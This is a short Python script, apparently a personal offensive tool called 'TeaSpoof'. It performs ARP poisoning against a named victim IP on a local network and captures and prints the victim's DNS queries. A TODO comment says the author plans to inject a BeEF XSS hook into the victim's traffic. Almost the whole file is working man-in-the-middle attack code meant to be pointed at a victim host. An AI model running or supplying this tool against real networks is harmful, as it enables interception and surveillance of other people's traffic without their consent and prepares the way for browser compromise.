#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
Author: tnt3k aka Luis Torres
License: BSD Clause-3
"""




"""
TODO: 
 -> Implement nfqueue to inject beef xss javascript hook
"""

from scapy.all import *
import threading
import os
import sys
import argparse
import netfilterqueue
#from netfilterqueue import NetfilterQueue



def dns_handler(pkt):
    try:
        if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
            print("Victim HTTP Request: " + pkt.getlayer(DNS).qd.qname)        
    except KeyboardInterrupt:
        print("[!] User cancelled, exitting ... ")

def arp_poison(interface, victim, gateway):
    attacker = get_if_hwaddr(interface)
    while True:
        sendp(Ether(dst = "FF:FF:FF:FF:FF:FF")/ARP(op = "is-at", psrc = victim, hwsrc = attacker), verbose = 0)
        pkt = sniff(iface = interface, filter = 'udp port 53', prn = dns_handler)

def main():
    parser = argparse.ArgumentParser(prog = './teaspoof.py', epilog = 'Powered by Pu-Erh')
    parser.add_argument("-i", "--interface", help = "Interface to use.", required = True)
    parser.add_argument("-v", "--victim", help = "Victim to poison.", required = True)
    parser.add_argument("-g", "--gateway", help = "Router IP", required = True)
    args = vars(parser.parse_args())
    # victim_poison(args.victim, args.gateway)
    # gateway_poison(args.victim, args.gateway)

    try:
        print("[*] Initializing TeaSpoof MITM ARP Poisoner")
        arp_poison(args["interface"], args["victim"], args["gateway"])
    except IOError:
        sys.exit("[!] Interface doesn't exist")
    except KeyboardInterrupt:
        print("\n[*] Stopping TeaSpoof MITM ARP Poisoner")

if __name__ == '__main__':
    main()